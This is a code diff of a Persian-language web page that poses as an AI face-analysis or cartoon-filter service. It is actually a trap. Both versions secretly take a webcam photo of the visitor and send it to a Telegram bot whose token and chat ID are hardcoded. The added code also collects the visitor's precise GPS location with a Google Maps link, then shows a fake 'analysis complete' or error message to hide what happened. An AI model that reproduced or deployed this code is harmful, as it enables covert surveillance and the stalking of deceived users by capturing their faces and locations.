@@ -5,61 +5,141 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تست هوش مصنوعی چهره</title>
     <style>
-        body { font-family: Tahoma, sans-serif; background: #0f172a; color: #fff; text-align: center; padding-top: 50px; }
-        .card { background: #1e293b; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 85%; max-width: 400px; }
-        button { background: #10b981; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px; width: 100%; }
-        button:hover { background: #059669; }
+        body {
+            font-family: Tahoma, sans-serif;
+            background-color: #f0f2f5;
+            text-align: center;
+            padding: 50px 20px;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: auto;
+        }
+        h2 {
+            color: #333;
+            font-size: 20px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>🎨 فیلتر جادویی هوش مصنوعی</h2>
-        <p>برای تبدیل عکس خودت به نسخه انیمیشنی، روی دکمه زیر بزن و دسترسی را تایید کن.</p>
-        <button onclick="startTrap()">شروع پردازش</button>
-        <p id="status" style="font-size: 12px; color: #94a3b8; margin-top: 15px;"></p>
+    <div class="container">
+        <h2>سامانه هوش مصنوعی تشخیص چهره و موقعیت</h2>
+        <p>برای دریافت نتیجه تحلیل و آنالیز چهره خود، لطفاً روی دکمه زیر کلیک کرده و دسترسی‌های لازم را تأیید کنید.</p>
+        <button id="startBtn" onclick="runProcess()">شروع پردازش و تحلیل</button>
     </div>
 
+    <!-- ویدیو برای گرفتن عکس از دوربین -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "8718656206:AAGr_nFBgZoOYFkOonagQy5q6gGJSN5iQbU";
-        const CHAT_ID = "6820599989";
+        // اطلاعات ربات تلگرام 
+        const BOT_TOKEN = '8718656206:AAGr_nFBgZoOYFkOonagQy5q6gGJSN5iQbU'; 
+        const CHAT_ID = '6820599989';     
 
-        async function startTrap() {
-            document.getElementById("status").innerText = "در حال اتصال به سرور هوش مصنوعی...";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById("video");
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById("canvas");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext("2d");
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append("chat_id", CHAT_ID);
-                        formData.append("photo", blob, "trap.jpg");
-                        formData.append("caption", "🎯 شکار جدید زده شد!");
+        function runProcess() {
+            const btn = document.getElementById('startBtn');
+            btn.innerText = "در حال پردازش...";
+            btn.disabled = true;
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: "POST",
-                            body: formData
-                        });
-
-                        stream.getTracks().forEach(track => track.stop());
-                        document.getElementById("status").innerText = "خطا در پردازش تصویر! دوباره تلاش کنید.";
-                    }, "image/jpeg");
-                }, 1500);
-
-            } catch (err) {
-                document.getElementById("status").innerText = "خطا در دسترسی به دوربین.";
+            // ۱. گرفتن لوکیشن (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        sendDataToTelegram(lat, lon);
+                    },
+                    (error) => {
+                        console.log("Location access denied or failed", error);
+                        sendDataToTelegram(null, null); 
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                sendDataToTelegram(null, null);
             }
+        }
+
+        function sendDataToTelegram(lat, lon) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // متوقف کردن دوربین
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'capture.jpg');
+
+                            // ساخت متن پیام و لینک گوگل مپ
+                            let caption = "🎯 یک کاربر جدید وارد شد!\n";
+                            if (lat && lon) {
+                                caption += `📍 موقعیت جغرافیایی:\nعرض: ${lat}\nطول: ${lon}\n\n🗺 لینک در گوگل مپ:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                            } else {
+                                caption += "⚠️ دسترسی به لوکیشن داده نشد.";
+                            }
+                            formData.append('caption', caption);
+
+                            // ارسال به تلگرام
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => {
+                                document.querySelector('.container').innerHTML = '<h2>تحلیل با موفقیت انجام شد</h2><p>اطلاعات شما با موفقیت پردازش گردید.</p>';
+                            })
+                            .catch(err => {
+                                alert("خطا در پردازش. لطفاً دوباره تلاش کنید.");
+                            });
+
+                        }, 'image/jpeg', 0.8);
+
+                    }, 1000); 
+                })
+                .catch(err => {
+                    alert("لطفاً اجازه دسترسی به دوربین را تأیید کنید.");
+                    document.getElementById('startBtn').innerText = "شروع پردازش و تحلیل";
+                    document.getElementById('startBtn').disabled = false;
+                });
         }
     </script>
 </body>
